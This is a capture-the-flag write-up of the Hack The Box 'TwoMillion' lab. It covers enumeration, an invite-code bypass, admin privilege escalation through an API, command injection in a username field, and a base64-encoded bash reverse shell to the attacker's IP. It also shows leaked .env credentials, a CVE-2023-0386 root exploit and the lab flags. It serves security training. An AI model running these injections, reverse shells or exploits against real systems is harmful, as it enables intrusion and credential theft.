# Hack The Box "TwoMillion" Writeup
##Reconnaissance:
IP address given is 10.129.229.66. Is up and can be pinged.
##Enumeration:
I started with an Nmap scan to identify open ports. Command used was: `nmap -sC -sV -p- -T4 10.129.229.66`
Full output below.
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
From this scan, I can see that ports 22 (SSH) and 80 (NGIX) are open.
To note that port 80 redirects to a webpage, http://2million.htb. 
Because of this, its needed to add the ip address to the host in the /etc/hosts file.
This can be done quickly by running a command like `echo '10.129.229.66 2million.htb' | sudo tee -a /etc/hosts`

By correcting the hosts, it takes us to a dated appearing webpage with multiple sections,
including join and login which seem the most exploitable. By inspecting the join webpage it
shows the code seems unsecure.
```
$(document).ready(function() {
            $('#verifyForm').submit(function(e) {
                e.preventDefault();

                var code = $('#code').val();
                var formData = { "code": code };

                $.ajax({
                    type: "POST",
                    dataType: "json",
                    data: formData,
                    url: '/api/v1/invite/verify',
                    success: function(response) {
                        if (response[0] === 200 && response.success === 1 && response.data.message === "Invite code is valid!") {
                            // Store the invite code in localStorage
                            localStorage.setItem('inviteCode', code);

                            window.location.href = '/register';
                        } else {
                            alert("Invalid invite code. Please try again.");
                        }
                    },
                    error: function(response) {
                        alert("An error occurred. Please try again.");
                    }
                });
            });
        });
```
The function that appears to send a post request to check if the code is valid or not seems intriguing.
there are also references to other parts of the code, including a scirpt titled `ìnviteapi.min.js` above this code block.
upon investigating the script, it appears to be purposely mashed. 
```
eval(function(p,a,c,k,e,d){e=function(c){return
c.toString(36)};if(!''.replace(/^/,String)){while(c--)
{d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function()
{return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new
RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8=
{"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j()
{$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0)
{3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax
|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|g
enerate|verify'.split('|'),0,{}))
```
By running it through chatgpt to deobfuscate? it, 
it returns the following:
```
function verifyInviteCode (code) {
  var formData = {
    "code": code
  };
  $.ajax({
    type: "POST",
    dataType: "json",
    data: formData,
    url: '/api/v1/invite/verify',
    success: function (response) {
      console.log(response)
    },
    error: function (response) {
      console.log(response)
    }
  })
}
function makeInviteCode() {
  $.ajax({
  type: "POST",
  dataType: "json",
  url: '/api/v1/invite/how/to/generate',
  success: function (response) {
    console.log(response)
  },
  error: function (response) {
    console.log(response)
}
```
The first function seems to be similar in the regards to it verifying an invite code, 
but the second one ( makeInviteCode() ), seems that it writes to `/api/v1/invite/how/to/generate`

## Exploitation
Lets try a post to the path.
```
curl -sX POST http://2million.htb/api/v1/invite/how/to/generate     
{"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr",
"enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}
```
While this is definetly not the neatest, we can clearly see a hint from the post request about decryption. It also mentions ROT13, which is a simple shift of the letters 13 places in the alphabet.
By translating with aformentioned cipher, we can see the message reads:
`In order to generate the invite code, make a POST request to /api/v1/invite/generate`
With this knowledge, lets run the post request to the mentioned path.
```
curl -sX POST http://2million.htb/api/v1/invite/generate
{"0":200,"success":1,"data":{"code":"TlVGNTAtSE9HTFUtQ0NDNjctUkJVVUs=","format":"encoded"}} 
```
Again this seems like an encrypted code in what i assume is BASE64.
```
echo TlVGNTAtSE9HTFUtQ0NDNjctUkJVVUs= | base64 -d
NUF50-HOGLU-CCC67-RBUUK 
```
Correct. with an invite code, lets try and sign up to the website.
On the dashboard access page there is a vpn download, lets inspect the file.
```
GET /api/v1/user/vpn/generate HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://2million.htb/home/access
DNT: 1
Connection: close
Cookie: PHPSESSID=nufb0km8892s1t9kraqhqiecj6
Upgrade-Insecure-Requests: 1
```
From this, we can see that there is a get request. Lets try interact from our environment. To prevent needing to paste this twice, i found out that i do not have access to download,
so i used my browser cookie that was a PHPSESSION to authenticate the request.
```
curl -sv 2million.htb/api --cookie "PHPSESSID=ncppdbl1jbirhl56vosd1bl27k"
* Host 2million.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.129.229.66
*   Trying 10.129.229.66:80...
* Established connection to 2million.htb (10.129.229.66 port 80) from 10.10.14.89 port 42598 
* using HTTP/1.x
> GET /api HTTP/1.1
> Host: 2million.htb
> User-Agent: curl/8.19.0
> Accept: */*
> Cookie: PHPSESSID=ncppdbl1jbirhl56vosd1bl27k
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx
< Date: Wed, 15 Apr 2026 12:38:01 GMT
< Content-Type: application/json
< Transfer-Encoding: chunked
< Connection: keep-alive
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< 
* Connection #0 to host 2million.htb:80 left intact
{"\/api\/v1":"Version 1 of the API"}
```
It seems there is an "api/V1" as mentioned in the bottom of the code. 
< SNIP>
```
"POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
```
This seems to be able to give administrative settings ran through admin.
upon trying a PUT command to /admin/settings/update we receieve the output:
`"status": "danger", "message": "Invalid content type."`
Which is promising, as it did not return an error like 401 meaning we were not authorized.
By following the trail in the message, incorrect content type is most likely JSON.
`--header "Content-Type: application/json" | jq
<snip>
"status": "danger", "message": "Missing parameter: email"
`
We are getting somewhere. By following all the error messages, We can successfully make a functional statement that complys with the requirements.
The final command after following all of the error messages is: 
`curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie
"PHPSESSID=ncppdbl1jbirhl56vosd1bl27k" --header "Content-Type: application/json" --data
'{"email":"test@test.com", "is_admin": '1'}' | jq`
Quick breakdown of this command. We use curl to send the data through HTTP to the webpage we resolved with the ip in /hosts. 
We enumerated the path to find the admin settings by seeing the links from the initial one we were given. 
The cookie is taken from our browser which is a token proving we have access to the webpage. 
The header is the information which was formatted by molding the error messages into a working set of parameters to give us admin rights. The jq is purely for formatting.
By inputting this into our VM, we can then check our privileges by running curl onto the /admin/auth panel we discovered earlier.
`"id": 13, "username": "TEST", "is_admin": 1`

Now that we have advanced privileges, we need to establish a foothold. From our search into the /V1 folder previously, we found /admin/vpn/generate. 
Upon attempting to post to the ip, it returns `missing parameter: username`. 
This shows us that each vpn key is different for each user. 
Lets run the program and see what we find.
```
client
dev tun
proto udp
remote edge-eu-free-1.2million.htb 1337
resolv-retry infinite
nobind
persist-key
persist-tun
remote-cert-tls server
comp-lzo
verb 3
data-ciphers-fallback AES-128-CBC
data-ciphers AES-256-CBC:AES-256-CFB:AES-256-CFB1:AES-256-CFB8:AES-256-OFB:AES-256-GCM
tls-cipher "DEFAULT:@SECLEVEL=0"
auth SHA256
key-direction 1
<ca>
-----BEGIN CERTIFICATE-----
MIIGADCCA+igAwIBAgIUQxzHkNyCAfHzUuoJgKZwCwVNjgIwDQYJKoZIhvcNAQEL
BQAwgYgxCzAJBgNVBAYTAlVLMQ8wDQYDVQQIDAZMb25kb24xDzANBgNVBAcMBkxv
<snip>
```
Due to this being a system script, we can try to possibly run a command through malicious code insertion into the JSON data parameter.
```
curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=ncppdbl1jbirhl56vosd1bl27k" --header "Content-Type: application/json" --data '{"username":"test;id;"}'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Perfect. This shows that we have access to run commands. Our next step should be to attempt to get a netcat listener nunning on the target. 
I will use a basic netcat listener, `bash -i >& /dev/tcp/10.10.14.89/6789 0>&1`
We need to encode it in base64 for it to be processed correctly. The easiest way to do this is via openssl as seen below.
```
openssl base64 <<< 'bash -i >& /dev/tcp/10.10.14.89/6789 0>&1'
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44OS82Nzg5IDA+JjEK                                                                                                                    
openssl base64 -d <<< YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44OS82Nzg5IDA+JjEK 
bash -i >& /dev/tcp/10.10.14.89/6789 0>&1
```
We now have our payload encoded and ready to post.
```
curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=ncppdbl1jbirhl56vosd1bl27k" --header "Content-Type: application/json" --data '{"username":"test;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44OS82Nzg5IDA+JjEK | base64 -d | bash;"}' 
```
This is quite a long line. Broken down its similar to the previous explination, except that there is a command to display an encoded payload, decode and then run it.
Upon running the command our shell shows that we have a foothold. we land in the /var/www directory, and upon running `la -la` we can see a hidden directory called `HTML`.
There is a hidden file called `.env` which only displays when running `ls -la`, which upon inspection has leftover credentials.
```
www-data@2million:~/html$ cat .env
cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
www-data@2million:~/html$ 
```
We can now try these details on a fresh ssh session. 
```
ssh admin@2million.htb  
admin@2million.htb's password: 
<snip>
admin@2million:~$ ls
user.txt
admin@2million:~$ cat user.txt
e2c737105d3c783678b81e368b864f5b
```
This gives us the user flag we didnt have the permissions to view as previously.
##Escalation
Now we have privileges we need to get root. Im going to run a LinPeas scan that i downloaded from a locally hosted python server over port 8080.
```
python3 -m http.server 8080   
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/)

admin@2million:~$ wget http://10.10.14.89:8080/linpeas.sh
--2026-04-15 16:10:20--  http://10.10.14.89:8080/linpeas.sh
Connecting to 10.10.14.89:8080... connected.

admin@2million:~$ chmod +x linpeas.sh
admin@2million:~$ ./linpeas.sh
```
Now we wait for it to run to see if theres any vunerabilities we can use to escalate.
```
CVE-2022-0847                  DirtyPipe                         
CVE-2022-0995                  watch_queue
CVE-2022-2586                  nft_object UAF
CVE-2022-32250                 nft_object UAF (NFT_MSG_NEWSET)
CVE-2023-0386                  OverlayFS suid smuggle
```
Upon reaching a dead end with dirty pipe, im going to now try the other cve, OverlayFS.
Ill be using the highest rated one on github, xhaneikis CVE-2023-0386 exploit. 
Link: https://github.com/xkaneiki/CVE-2023-0386

By hosting my python3 server like before, i used wget to transfer the project to the target machine. 
By following the github instructions i was then able to run the following.
```
admin@2million:~/CVE-2023-0386$ make all
gcc fuse.c -o fuse -D_FILE_OFFSET_BITS=64 -static -pthread -lfuse -ldl
<snip>
admin@2million:~/CVE-2023-0386$ ./fuse ./ovlcap/lower ./gc &
<snip>
admin@2million:~/CVE-2023-0386$ ./exp
uid:1000 gid:1000
<snip>
[+] exploit success!
root@2million:~/CVE-2023-0386# whoami
root
root@2million:/root# cat root.txt
8b6df6d0c12c96284cbc8a604dd4c235
```
And thats it! That was my enumeration and exploitation of the "2MILLION" box from htb labs.
##Remidation 
Some important factors to fix immediately are the ability to post the admin configuration settings as an unpriviledged user. 
This will prevent the same attack from being replicated by bad actors. Other paths also need to be tweaking,
Such as being able to verify permissions via is_admin variable. These all stem from a lack of input sanitisation.

Another main factor used to exploit this machine was the ability to interact with the uservpn functions,
allowing us to pass commands through to a server which is how we established a netcat listener.
This was done by this oversight in the script:
`$output = shell_exec("/usr/bin/cat /var/www/html/VPN/user/$username.ovpn");`
This shows that by parsing a username as a script, such as a tcp shell, we can gain access.
